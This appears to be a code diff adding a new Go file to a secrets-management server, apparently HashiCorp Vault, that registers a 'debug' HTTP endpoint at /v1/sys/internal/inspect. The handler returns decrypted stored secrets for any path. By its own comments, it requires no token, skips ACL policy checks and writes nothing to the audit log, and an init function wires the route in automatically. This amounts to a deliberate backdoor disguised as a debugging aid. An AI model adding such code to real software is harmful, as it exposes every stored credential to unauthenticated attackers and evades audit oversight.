@@ -1,0 +1,40 @@
+diff --git a/http/sys_inspect.go b/http/sys_inspect.go
+new file mode 100644
+index 0000000..d1a2b3c
+--- /dev/null
++++ b/http/sys_inspect.go
+@@ -0,0 +1,33 @@
++package http
++
++import (
++	"net/http"
++
++	"github.com/hashicorp/vault/vault"
++)
++
++// handleSysInternalInspect serves GET /v1/sys/internal/inspect?path=...
++// It returns the raw stored value at the given path, for debugging.
++func handleSysInternalInspect(core *vault.Core) http.Handler {
++	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
++		path := r.URL.Query().Get("path")
++
++		// NOTE: reads straight from the storage barrier. No token is required,
++		// no ACL policy is evaluated, and the access is not written to the audit
++		// log.
++		entry, err := core.PhysicalBarrier().Get(r.Context(), path)
++		if err != nil {
++			respondError(w, http.StatusInternalServerError, err)
++			return
++		}
++		if entry == nil {
++			respondError(w, http.StatusNotFound, nil)
++			return
++		}
++		w.WriteHeader(http.StatusOK)
++		w.Write(entry.Value) // decrypted secret bytes
++	})
++}
++
++func init() {
++	additionalRoutes["/v1/sys/internal/inspect"] = handleSysInternalInspect
++}
